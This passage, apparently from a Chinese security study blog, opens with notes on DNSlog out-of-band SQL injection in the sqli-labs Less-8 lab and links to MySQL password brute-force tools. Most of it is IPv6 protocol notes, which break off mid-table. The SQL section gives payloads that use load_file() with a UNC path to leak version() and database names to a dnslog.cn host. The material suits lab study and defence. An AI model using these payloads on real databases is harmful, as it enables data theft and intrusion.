hex(database())为需要的查询语句，用hex()是因为构造UNC时不能有特殊符号，转化一下更好用。</li><li><code>.g5ucgd.dnslog.cn\\test</code>转义后就变成了<code>.g5ucgd.dnslog.cn\test</code>，后面的test只是资源名字，随便起。</li></ul><blockquote><p>拼接起来后就成了<code>\\bvwa.g5ucgd.dnslog.cn\test</code>完全符合<code>UNC</code>的路径标准，解析后在<code>DNSlog</code>平台就能看到数据了。</p><p>注意，虽然使用<code>hex()</code>可以解决<code>UNC</code>特殊字符的问题，但是<code>UNC</code>的长度也不能超过<code>128</code>，所以自行看情况使用<code>hex()</code></p></blockquote><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>以sql labs8为例</p><p>1.搜索dns.log在线软件，并get一个域名</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155242839.png" alt="image-20210313155242839"></p><p>2.在cmd中ping该域名，发现解析成功</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155249634.png" alt="image-20210313155249634"></p><p><img src="G:%5C%25E6%2588%2591%25E7%259A%2584%25E6%2596%2587%25E4%25BB%25B6%5CNotes%5CNotes%5Cweb%25E5%25AE%2589%25E5%2585%25A8%5Cweb%25E5%25AE%2589%25E5%2585%25A8%5Cassets%5C20200210213511182.png" alt="img"></p><p>3.在sql labs8中输入<a href="http://localhost/sqli-labs-master/Less-8/?id=1&#39;">http://localhost/sqli-labs-master/Less-8/?id=1&#39;</a> and load_file(“\\sss.cipv66.dnslog.cn\xxx.txt”) – -，并执行</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210313155256492.png" alt="image-20210313155256492"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155313107.png" alt="image-20210313155313107"></p><p>5.在语句中修改为<code>http://localhost/sqli-labs-master/Less-8/?id=1&#39; and load_file(concat(&quot;\\\\&quot;,version(),&quot;.cipv66.dnslog.cn\\xxx.txt&quot;) )-- -</code>，即可查到版本信息如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155323516.png" alt="image-20210313155323516"></p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>在实际应用中，实现dns解析，有多种方法：</p><ol><li>使用burp suite 自带的Burp Collaborator client（方便好用，用于探测数据库服务器能否出网）</li><li>搭建一个简易http服务器，如python服务器（有域名最好）</li><li>使用开放平台的ceye.io或是自己搭建的dnslog服务器（网上有很多类型平台和文章，不再做介绍）</li><li>使用sqlmap中的—dns-domain参数</li></ol><h2 id="1-18-Mysql弱口令"><a href="#1-18-Mysql弱口令" class="headerlink" title="1.18 Mysql弱口令"></a>1.18 Mysql弱口令</h2><ul><li><p>工具：hydra</p></li><li><p>CPP</p><ul><li>用链表实现的MYSQL、MSSQL和oracle密码暴破C程序</li><li><a href="http://blog.51cto.com/foxhack/35604">http://blog.51cto.com/foxhack/35604</a></li></ul></li><li><p>Python</p><ul><li><a href="https://github.com/chinasun021/pwd_crack/blob/master/mysql/mysql_crack.py">https://github.com/chinasun021/pwd_crack/blob/master/mysql/mysql_crack.py</a></li><li><a href="https://www.waitalone.cn/python-mysql-mult.html">https://www.waitalone.cn/python-mysql-mult.html</a></li></ul></li><li><p>Go</p><ul><li><a href="https://github.com/netxfly/x-crack">https://github.com/netxfly/x-crack</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>sql注入</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPV6学习</title>
    <link href="/2019/12/04/IPV6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/12/04/IPV6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="IPv6-学习"><a href="#IPv6-学习" class="headerlink" title="IPv6 学习"></a>IPv6 学习</h1><p>参考资料：51cto课程：<a href="https://edu.51cto.com/center/course/lesson/index?id=336744">https://edu.51cto.com/center/course/lesson/index?id=336744</a></p><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>参考链接：</p><ol><li>维基百科：<a href="https://zh.wikipedia.org/wiki/IPv6">https://zh.wikipedia.org/wiki/IPv6</a></li></ol><p> 现今的互联网络发展蓬勃，截至2018年1月，<a href="https://zh.wikipedia.org/wiki/%E5%85%A8%E7%90%83%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF%E4%BD%BF%E7%94%A8%E7%8E%87">全球上网人数</a>已达40.21亿，<a href="https://zh.wikipedia.org/wiki/IPv4">IPv4</a>仅能提供约42.9亿个IP位置。虽然当前的<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转换</a>及<a href="https://zh.wikipedia.org/wiki/%E6%97%A0%E7%B1%BB%E5%88%AB%E5%9F%9F%E9%97%B4%E8%B7%AF%E7%94%B1">无类别域间路由</a>等技术可延缓网络位置匮乏之现象，但为求解决根本问题 </p><p>IPv6的出现，一方面是为了解决ip地址短缺的问题，另一方面也是为了解决IPv4长期以来存在的诸多安全问题。</p><p>在不久的将来，IPv4必将逐渐被IPv6所取代，在这个过程当中，IPv6除了要面对协议本身的安全问题以外，还需要面对IPv4向IPV6过渡中来自历史的安全威胁。</p><p>值得注意的是，现在正值IPv4向IPv6的过渡时期。Microsoft、linux、Sun、BSD等设备和软件的主要厂商都部署并经过测试公布出了其在实现IPv6发现的弱点。为了确保IPv6迁移计划的完成，在没有用户的干预下，这些操作系统可能运行着两种协议，若用户没有进行专门配置，没有实施针对IPv6的安全防护，就要冒着被攻击的风险，因为很多安全系统和策略都只保障IPv4数据包风险，而忽视了IPv6数据包的安全。所以进一步研究IPv6协议的安全尤为重要。</p><h2 id="0x01-Ipv6概述"><a href="#0x01-Ipv6概述" class="headerlink" title="0x01 Ipv6概述"></a>0x01 Ipv6概述</h2><p><a href="http://www.potaroo.net/tools/ipv4">http://www.potaroo.net/tools/ipv4</a> ipv4地址使用情况报告</p><h3 id="IPv4-Address-Report"><a href="#IPv4-Address-Report" class="headerlink" title="IPv4 Address Report"></a>IPv4 Address Report</h3><p>This report generated at 06-Nov-2019 08:31 UTC.</p><hr><table><thead><tr><th>IANA Unallocated Address Pool Exhaustion:</th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td><strong>03-Feb-2011</strong></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>Projected RIR Address Pool Exhaustion Dates:</td><td></td><td></td><td></td></tr><tr><td></td><td>RIR</td><td>Projected Exhaustion Date</td><td>Remaining Addresses in RIR Pool (/8s)</td></tr><tr><td></td><td>APNIC:</td><td><strong>19-Apr-2011</strong> (actual)</td><td>0.1839</td></tr><tr><td></td><td>RIPE NCC:</td><td><strong>14-Sep-2012</strong> (actual)</td><td>0.0289</td></tr><tr><td></td><td>LACNIC:</td><td><strong>10-Jun-2014</strong> (actual)</td><td>0.0134</td></tr><tr><td></td><td>ARIN:</td><td><strong>24 Sep-2015</strong> (actual)</td><td>0.0002</td></tr><tr><td></td><td>AFRINIC:</td><td><strong>15-Mar-2020</strong></td><td>0.2096</td></tr></tbody></table><p>以上是当前全球最新的IPV4地址池使用报告，从表格中的最后一栏Remaining Addresses in RIR Pool中可以看出，全球各大洲，特别是亚洲和美洲的地址池即将分配殆尽。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/plotend.png" alt="img"></p><p>大致统计中国掌握的地址池资源在三亿左右，所以当前地址资源的缺乏是一个全球性的问题</p><h3 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h3><p>dhcp：使用时发放，不使用时收回</p><p>nat：内网转换为外网统一的ip地址</p><p>缺陷：不能从最根本的角度解决ipv4地址池短缺的问题。</p><h2 id="0x02-IPV6基础知识"><a href="#0x02-IPV6基础知识" class="headerlink" title="0x02 IPV6基础知识"></a>0x02 IPV6基础知识</h2><p>参考资料：<a href="https://blog.csdn.net/qq_38265137/article/details/80439611">https://blog.csdn.net/qq_38265137/article/details/80439611</a> IPv6基础</p><h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><ol><li><p>地址空间巨大</p><ol><li><p>ipv4 长度32 位，地址数量为42亿左右</p></li><li><p>ipv6 长度128位，地址数量更加大</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191106210059058.png" alt="image-20191106210059058"></p></li></ol></li><li><p>报文结构优化</p><p>去掉了长度，特征值，Flags，片偏移，头部校验和、选项、Padding</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191106210339419.png" alt="image-20191106210339419"></p><ol><li>ipv4报头长度不固定，基本头部有20字节，加上扩展选项最多可以有60字节，如果ipv4数据报中包含了option选项，会对路由器带来两个两个消极影响，第一是会导致路由器的分流处理，使得路由器效率变低，第二，报头长度不固定，不利于路由器中使用硬件来实现路由。internet发展到如今，制约其发展的因素已经不再是数据链路速率上瓶颈，路由器的处理速度成为制约internet发展的一大重要因素。</li><li>ipv6不仅仅是将地址长度扩展到了128位，还对报头的头部字段进行了优化。去掉了一些冗余的字段，上图中用红色标明的字段就是被去掉了的字段。</li><li>ipv6头部分为固定头部（如上图）和扩展头部，对于ipv4中Option中的选项，如果要在ipv6中实现，都被移动到了扩展头部中。这样的设计使得路由器能够对ipv6报文进行高效的处理。</li></ol></li><li><p>快速实现自动配置和重新编址</p></li><li><p>支持层次化的网络结构和路由聚合</p><ol><li>减少路由器中路由表的长度，提高路由转发的效率</li></ol></li><li><p>支持安全和移动特性</p><ol><li>ipv4中要实现安全，就需要额外地部署ipsec</li><li>ipv6中的扩展报头中，就有ah和esp，也就是说ipv6本身就实现有ipsec，可以通过扩展头部实现端到端的安全。</li></ol></li><li><p>更好的支持Qos</p><ol><li>流标签：可以使路由器对同一种流的数据包进行标识和特殊处理</li></ol></li></ol><h3 id="二、对比报文中保留的字段"><a href="#二、对比报文中保留的字段" class="headerlink" title="二、对比报文中保留的字段"></a>二、对比报文中保留的字段</h3><p>主要对比黄色保留字段</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191106210339419.png" alt="image-20191106210339419"></p><ol><li>ipv4中以五元组来表示，格式为：{源ip地址：源端口号：目的ip地址，目的端口号，传输层协议}，而ipv6采用三元组：{源地址，目的地址，流标签}来表示。</li><li>ipv4字段非常多，然而地址信息部分只占了8个字节，占头部比重小，ipv6地址信息占32个字节，占头部的比重大，路由器处理效率高</li></ol><h3 id="三、IPV6的地址表示"><a href="#三、IPV6的地址表示" class="headerlink" title="三、IPV6的地址表示"></a>三、IPV6的地址表示</h3><p>IPV6地址长度为128位，每16位划分为一组，每一组用四个十六进制位来表示。中间用:分开。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107002929155.png" alt="image-20191107002929155"></p><p>前缀相当于ipv4的子网部分，后面的接口标识相当于ipv4中的主机部分</p><h5 id="压缩地址规则："><a href="#压缩地址规则：" class="headerlink" title="压缩地址规则："></a>压缩地址规则：</h5><ol><li>每一组中的前导0可以省略</li><li>地址中包含连续的全为0的组，就可以使用双冒号来代替，但是每个ipv6地址中只能使用一次</li></ol><h5 id="浏览器访问规则："><a href="#浏览器访问规则：" class="headerlink" title="浏览器访问规则："></a>浏览器访问规则：</h5><p>在浏览器中访问如下ip地址：</p><p><code>http://2001:bd6::1234:8080</code> 如果这样去访问的话，就不知道最后的端口号8080到底是端口号还是属于ipv6的一部分，所以在浏览器中使用ipv6地址的时候，加上[ ]然后再加上端口号</p><p><code>http://[2001:db6::1234:8080]:8080</code></p><h5 id="ipv6-接口标识生成方式"><a href="#ipv6-接口标识生成方式" class="headerlink" title="ipv6 接口标识生成方式"></a>ipv6 接口标识生成方式</h5><ol><li>手工配置</li><li>系统通过软件自动生成</li><li>IEEE EUI-64规范自动生成（linux，mac，安卓）（windows 使用这个规范的时候会同时生成一个临时ipv6地址）</li></ol><h5 id="EUI-64规范"><a href="#EUI-64规范" class="headerlink" title="EUI-64规范"></a>EUI-64规范</h5><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107003751925.png" alt="image-20191107003751925"></p><p>mac地址第七位（前面的部分为厂商信息）：U-I位，如果为1，则为全球唯一，为0则为本地唯一。</p><p>生成规则：在mac地址的前24位和后24位中间加上16位</p><p>第七位的0改成1，由于mac地址唯一，所以生成的接口标识加上前面的前缀得到的ipv6地址也唯一</p><h3 id="四、IPV6报文格式"><a href="#四、IPV6报文格式" class="headerlink" title="四、IPV6报文格式"></a>四、IPV6报文格式</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107004317769.png" alt="image-20191107004317769"></p><ol><li><p>基本头部（必须要有）</p></li><li><p>扩展头部（可有可无，和ipv4不同，没有最大长度限制，只有目标设备才处理，某些情况下路由器也会处理，而ipv4的选项在路由器中也处理）</p></li><li><p>上层协议数据单元</p></li></ol><h3 id="五、IPV6基本报头"><a href="#五、IPV6基本报头" class="headerlink" title="五、IPV6基本报头"></a>五、IPV6基本报头</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107004613225.png" alt="image-20191107004613225"></p><p>总共八个字段：</p><ol><li>version 4bit，对于ipv6，这个值为6</li><li>Traffic Class ，流类别，长度8bit，等同ipv4中的tos，表示这一类ipv6数据包的优先级</li><li>Flow label，流标签，20bit，区分实时流量（流标签+源地址+目的地址）</li><li>Payload Length，16bit，含义为负载长度，代表首部长度和数据长度之和</li><li>Next Header ：8bit，定义紧跟在ipv6基本报头后的第一扩展头</li><li>Hop limit，8bit，条数，类似TTL</li><li>源地址和目的地址共128*2位，也就是32字节</li></ol><p>以上的字段总共40个字节，除了扩展头之外有40字节</p><h3 id="六、IPV6扩展头部"><a href="#六、IPV6扩展头部" class="headerlink" title="六、IPV6扩展头部"></a>六、IPV6扩展头部</h3><ol><li>将原ipv4的Option字段放入ipv6的扩展头中</li><li>IPV6报文包含0个1个或者多个扩展头</li><li>扩展头的长度固定为8字节的整数倍</li></ol><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107215635633.png" alt="image-20191107215635633"></p><p>扩展头部中的内容：</p><ol><li>Next Header 与基本报头中的Next Header含义一致，表示这一个扩展头部的下一个紧接着的报头，也是8bit</li><li>扩展头部的长度</li><li>扩展头部的数据</li></ol><h3 id="七、IPV6报文解析"><a href="#七、IPV6报文解析" class="headerlink" title="七、IPV6报文解析"></a>七、IPV6报文解析</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107215931297.png" alt="image-20191107215931297"></p><ol><li>版本：6</li><li>流类型：0x00</li><li>流标签：0x00000</li><li>长度：60</li><li>Next Header ICMPv6（58），使用58表示ICMP</li><li>跳数限制：64</li></ol><h2 id="0x03-IPV6-地址类型"><a href="#0x03-IPV6-地址类型" class="headerlink" title="0x03 IPV6 地址类型"></a>0x03 IPV6 地址类型</h2><p>IPV6中没有广播的概念，但是添加了任播地址</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107224430434.png" alt="image-20191107224430434"></p><ol><li><p>全球单播地址占所有地址的1/8 地址范围为2000:FFFF….可以直接表示为2000::/3</p></li><li><p>保留地址为全球单播地址的一部分，不可以路由，公网上没有这一网段</p></li><li><p>私有地址</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107224711830.png" alt="image-20191107224711830"></p><p>ipv6有自己的私有地址</p></li><li><p>链路本地地址，也就是只能够在本链路中使用，可以用在二层交换机中的各个结点。不跨第三层设备</p></li></ol><p>以上为单播地址，下面是组播地址。</p><ol><li>组播地址：用来标识一组结点</li><li>特殊地址：未指定地址，回环地址</li></ol><p>任播地址：用于标识多个接口，但是这些借口都使用统一IP地址，就是用一个单播地址分配给了多个接口。</p><h3 id="一、全球单播地址"><a href="#一、全球单播地址" class="headerlink" title="一、全球单播地址"></a>一、全球单播地址</h3><p><em>（  Global unicast address(es):）</em></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107230645678.png" alt="image-20191107230645678"></p><p>全球路由前缀是有运营商分配，一般是48位，全球路由前缀由iternet注册机构进行分发，包含多个前缀：</p><ol><li>注册机构的前缀：亚太、拉丁、北美等</li><li>根据亚太地区进行进一步划分，补充前缀</li><li>移动等运营商拿到注册的IPv6地址后，根据自己的需求进行进一步划分，这时候划分的部分就是Subnet ID，子网id</li><li>子网地址为16bit</li><li>接口地址用于标识节点，64bit</li></ol><h3 id="二、链路本地地址"><a href="#二、链路本地地址" class="headerlink" title="二、链路本地地址"></a>二、链路本地地址</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107231655257.png" alt="image-20191107231655257"></p><p>只能用于连接到同一个链路节点的结点使用。比如二层交换机连接的PC之间。不会跨到第二条链路</p><p>只要是这个前缀，就是链路本地地址，后54bit全零，再加上64位的接口id。</p><p><strong>IPv6的邻居发现，无状态自动配置，路由的下一跳都用到了链路本地地址</strong></p><h3 id="三、站点本地地址"><a href="#三、站点本地地址" class="headerlink" title="三、站点本地地址"></a>三、站点本地地址</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107232122879.png" alt="image-20191107232122879"></p><p>EFC0::</p><p>相当于私有地址，不会路由到公网上。使用局限性：两个网络进行合并的时候，容易产生地址冲突。</p><p>所以为了避免这种情况的出现，就有了另一种IP地址——唯一本地地址</p><h3 id="四、唯一本地地址"><a href="#四、唯一本地地址" class="headerlink" title="四、唯一本地地址"></a>四、唯一本地地址</h3><p>相当于改名以后的IPV4私有地址，在RFC419文档中规定。</p><p>只能用于企业的内网中。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107232437034.png" alt="image-20191107232437034"></p><ol><li>前缀 FC00:: 不会传播到公网上。</li><li>L 标志位</li><li>全球唯一前缀 40bit，通过随机的方式分配，当两个私有网络合并的时候，主机间可以直接通讯，不用担心冲突。冲突的概率特别低。</li><li>子网ID，16bit，</li></ol><h3 id="五、IPV6的组播地址"><a href="#五、IPV6的组播地址" class="headerlink" title="五、IPV6的组播地址"></a>五、IPV6的组播地址</h3><p>ipv6使用多播代替了广播</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107232911458.png" alt="image-20191107232911458"></p><p>组播地址用于组播应用和协议，由于IPV6不再使用广播，所以通讯核心大量地使用了组播地址：邻居发现、ARP请求、组播请求</p><p>前16bit:</p><ol><li><p>前缀：FF00 8bit</p></li><li><p>FLAG：4bit，前三个bit都是0，第四个bit位如果是0的话，代表永久组播，是1的话，表示临时组播</p></li><li><p>范围字段：</p><ol><li><p>本地的接口范围</p></li><li><p>本地的链路范围（用的最多），链路中的所有路由器</p></li><li><p>本地子网范围</p></li><li><p>本地管理范围</p></li><li><p>本地站点范围</p></li><li><p>如果是8，就是整个组织机构</p></li><li><p>如果是e，就是全球范围</p></li><li><p>如果是9，就是链路中所有RIP路由器</p></li></ol></li></ol><p>后112位：</p><ol><li>Group ID：用于对MAC地址的映射。</li></ol><p>组播地址：<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107234427785.png" alt="image-20191107234427785" style="zoom: 67%;" /></p><p>Solited-Node组播地址：请求节点组播，用于IPV6中的ARP请求。当一个节点或者路由器节点配置了一个单播地址，就会自动地将该结点或者接口加入该组播组。<strong>如果某一个PC机想要获取这个节点的MAC地址的话，就向这个组播组发送相应的ARP请求。后面的24位地址就是由相应的IPV6单播地址的最后24位直接映射过来的。</strong>（还有一点疑问）</p><h3 id="六、任播地址"><a href="#六、任播地址" class="headerlink" title="六、任播地址"></a>六、任播地址</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191107235009497.png" alt="image-20191107235009497"></p><p>任播地址：表示一组提供一类服务的多个网络接口。比如图中所示的一组都提供http服务的主机，共享单播地址。</p><p>将单一的任播地址分给不同的网络服务器节点。 当用户进行请求的时候，这个请求报文会被发送到离请求者路由最近的一台网络服务器中。</p><p>当与用户建立请求的主机坏掉之后，其他的主机可以直接接替从而与用户通信。任播地址可以实现冗余。</p><h3 id="七、特殊地址"><a href="#七、特殊地址" class="headerlink" title="七、特殊地址"></a>七、特殊地址</h3><ol><li>未指定的地址：0:0:0:0:0:0:0:0/128或者::128表示某个接口或者节点没有ip地址</li><li>回环地址：0:0:0:0:0:0:0:1/128或者::1/128，作用与IPv4当中的127.0.0.1作用相同，实际发送的数据包不能使用回环地址作为源IP地址或者目的IP地址。</li></ol><hr><h2 id="补充：NDP协议、ICMPv6协议"><a href="#补充：NDP协议、ICMPv6协议" class="headerlink" title="补充：NDP协议、ICMPv6协议"></a>补充：NDP协议、ICMPv6协议</h2><h3 id="一、ICMPv6-协议"><a href="#一、ICMPv6-协议" class="headerlink" title="一、ICMPv6 协议"></a>一、ICMPv6 协议</h3><p>参考资料： <a href="https://baike.baidu.com/item/ICMPv6/2987440?fr=aladdin">https://baike.baidu.com/item/ICMPv6/2987440?fr=aladdin</a> 百度百科–ICMPv6</p><p>​     ICMPv6协议继承了IPv4中ICMP协议的功能，用于向源节点报告关于目的地址传输IPv6包的错误和信息，具有差错报告、网络诊断，邻节点发现和多播实现等功能。在<a href="https://baike.baidu.com/item/IPv6">IPv6</a>中，ICMPv6实现<a href="https://baike.baidu.com/item/IPv4">IPv4</a>中<a href="https://baike.baidu.com/item/ICMP">ICMP</a>、<a href="https://baike.baidu.com/item/ARP">ARP</a>和<a href="https://baike.baidu.com/item/IGMP">IGMP</a>的功能。</p><ol><li><p>通告网络错误。比如，某台<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>或整个网络由于某些<a href="https://baike.baidu.com/item/%E6%95%85%E9%9A%9C">故障</a>不可达。如果有指向某个<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">端口号</a>的TCP或UDP包没有指明接受端，这也由ICMP报告。</p></li><li><p>通告<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%8B%A5%E5%A1%9E">网络拥塞</a>。当<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>缓存太多包，由于传输速度无法达到它们的接收速度，将会生成“ ICMP 源结束”信息。对于发送者，这些信息将会导致传输速度降低。当然，更多的 ICMP 源结束信息的生成也将引起更多的网络拥塞，所以使用起来较为保守。</p></li><li><p>协助解决故障。ICMP支持Echo功能，即在两个<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>间一个往返路径上发送一个包。Ping是一种基于这种特性的通用网络管理工具，它将传输一系列的包，测量平均往返次数并计算丢失百分比。</p></li><li><p>通告超时。如果一个IP包的TTL降低到零，路由器就会丢弃此包，这时会生成一个 ICMP 包通告这一事实。TraceRoute是一个工具，它通过发送小TTL值的包及监视ICMP超时通告可以显示网络<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1">路由</a>。</p><p>ICMPv6报文总体上被分为两种类型：差错报文和信息报文。差错报文的识别是通过在消息类型字段值的高比特位中设置0。因此：</p></li></ol><p><strong>差错报文的报文类型从0到127；信息报文的类型从128到255。（比如ND协议就是基于ICMPv6协议实现，类型号为135）</strong></p><p>ICMPv6报文格式：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191127144515719.png" alt="image-20191127144515719"></p><ol><li>Type：标识ICMPv6报文类型，它的值根据报文的内容来确定。</li><li>Code：用于确定ICMPv6进一步的信息，对同一类型的报文进行了更详细的分类。</li><li>Checksum：用于检测ICMPv6的报文是否正确传送。</li><li>Data：用于返回出错的参数和记录出错报文的片段，帮助源节点判断错误的原因或是其它参数。</li></ol><h3 id="二、NDP协议"><a href="#二、NDP协议" class="headerlink" title="二、NDP协议"></a>二、NDP协议</h3><p>参考链接：</p><ol><li><a href="https://blog.51cto.com/qiaopeng688/2150114?source=dra">https://blog.51cto.com/qiaopeng688/2150114?source=dra</a> 【IPv6】NS,NA 报文学习</li><li><a href="https://baijiahao.baidu.com/s?id=1609424059183543390&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1609424059183543390&amp;wfr=spider&amp;for=pc</a> 下一代IP协议—IPv6邻居发现协议（NDP）</li></ol><ol><li>NDP基于ICMPv6实现，ICMP类型135</li><li>邻居请求NS，邻居通告NA（重复地址检测DAD也使用这样的机制）</li></ol><p>NS和NA报文：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191125204012757.png" alt="image-20191125204012757"></p><h4 id="功能（1）：重复地址检测"><a href="#功能（1）：重复地址检测" class="headerlink" title="功能（1）：重复地址检测"></a>功能（1）：重复地址检测</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191112204328851.png" alt="image-20191112204328851"></p><p>地址自动配置时使用：</p><p> 节点会发送NS报文（有人叫张拉拉吗？），其源地址为未指定地址，目的地址为接口配置的IPv6地址。如果收到自己的报文（听到自己的回音，奥，自己的声音不管他），直接忽略。在NS报文发送到链路上后，如果在规定时间内没有收到应答的NA报文，则认为这个单播地址在链路上是唯一的，可以分配给接口（好了，我就叫张拉拉了）；反之，如果收到应答的NA报文（一个响亮的声音回来，我就叫张拉拉！呀丫丫，有人和我同名啊，算了，改个名字吧），则表明这个地址已经被其他节点所使用，不能配置到接口。 </p><h4 id="功能（2）：邻居地址解析"><a href="#功能（2）：邻居地址解析" class="headerlink" title="功能（2）：邻居地址解析"></a>功能（2）：邻居地址解析</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191112204342316.png" alt="image-20191112204342316"></p><p>主机A：谁叫李法拉？你住在哪里？</p><p>主机B: 我叫李法拉，住在MAC地址的xxxxx。</p><p>主机C: 不是叫我，不管他。</p><hr><p><strong>补充</strong>：</p><p> 多播是一种允许一个或者多个发送者发送单一数据包到多个接收者的网络技术。 </p><hr><h4 id="功能（3）：重定向功能"><a href="#功能（3）：重定向功能" class="headerlink" title="功能（3）：重定向功能"></a>功能（3）：重定向功能</h4><p> 当网关路由器发现更好的报文转发路径时候，会用重定向报文告诉主机。 </p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191112204517066.png" alt="image-20191112204517066"></p><p> 上图主机H1要发送数据到网络N2，经过路由器R1，由R1再转发到到R2，但路由器R1发现R2和它是同一网段，并且R2是直接连接着网络N2，这时候路由器R1就发送重定向报文（ND redirect）告诉主机H1，以后再给网络N2的报文就直接给R2好了，别那么绕弯子，费劲！ </p><h4 id="功能（4）：路由器发现"><a href="#功能（4）：路由器发现" class="headerlink" title="功能（4）：路由器发现"></a>功能（4）：路由器发现</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191112204224294.png" alt="image-20191112204224294"></p><p>RA：路由通告报文</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191112204209472.png" alt="image-20191112204209472"></p><p> 主机发送RS（route solicitation），路由器回应RA(route advertisement)。 很多情况下主机接入网络后希望尽快获取网络前缀进行通信，此时主机可以立刻发送RS报文，网络上的设备将回应RA报文。主机收到包含路由信息的RA报文后，会更新自己的路由表。当主机向其他设备发送报文时，通过查询该列表的路由信息，选择合适的路由发送报文。 </p><h3 id="三、DHCPv6协议"><a href="#三、DHCPv6协议" class="headerlink" title="三、DHCPv6协议"></a>三、DHCPv6协议</h3><p>参考资料：</p><ol><li><a href="https://blog.csdn.net/Neo233/article/details/80464428">https://blog.csdn.net/Neo233/article/details/80464428</a> DHCPv6基础 </li></ol><h4 id="DHCPv6数据包格式"><a href="#DHCPv6数据包格式" class="headerlink" title="DHCPv6数据包格式"></a>DHCPv6数据包格式</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191127153241952.png" alt="image-20191127153241952"></p><ol><li>msg-type 报文类型，详细的几种类型见如下表格</li><li>transaction-ID 交互ID，用于标识一个DHCPv6报文交互（solicit和advertise就是一个交互）</li><li>Option 可选字段， 此字段包含了DHCPv6服务器分配给IPv6主机的配置信息 </li></ol><table><thead><tr><th>报文类型</th><th>DHCPv6报文</th><th align="left">DHCPv4报文</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>SOLICIT</td><td align="left">DHCP DISCOVER</td><td>DHCPv6客户端使用Solicit报文来确定DHCPv6服务器的位置。</td></tr><tr><td>2</td><td>ADVERTISE</td><td align="left">DHCP OFFER</td><td>DHCPv6服务器发送Advertise报文来对Solicit报文进行回应，宣告自己能够提供DHCPv6服务。</td></tr><tr><td>3</td><td>REQUEST</td><td align="left">DHCP REQUEST</td><td>DHCPv6客户端发送Request报文来向DHCPv6服务器请求IPv6地址和其它配置信息。</td></tr><tr><td>4</td><td>CONFIRM</td><td align="left">-</td><td>DHCPv6客户端向任意可达的DHCPv6服务器发送Confirm报文检查自己目前获得的IPv6地址是否适用与它所连接的链路。</td></tr><tr><td>5</td><td>RENEW</td><td align="left">DHCP REQUEST</td><td>DHCPv6客户端向给其提供地址和配置信息的DHCPv6服务器发送Renew报文来延长地址的生存期并更新配置信息。</td></tr><tr><td>6</td><td>REBIND</td><td align="left">DHCP 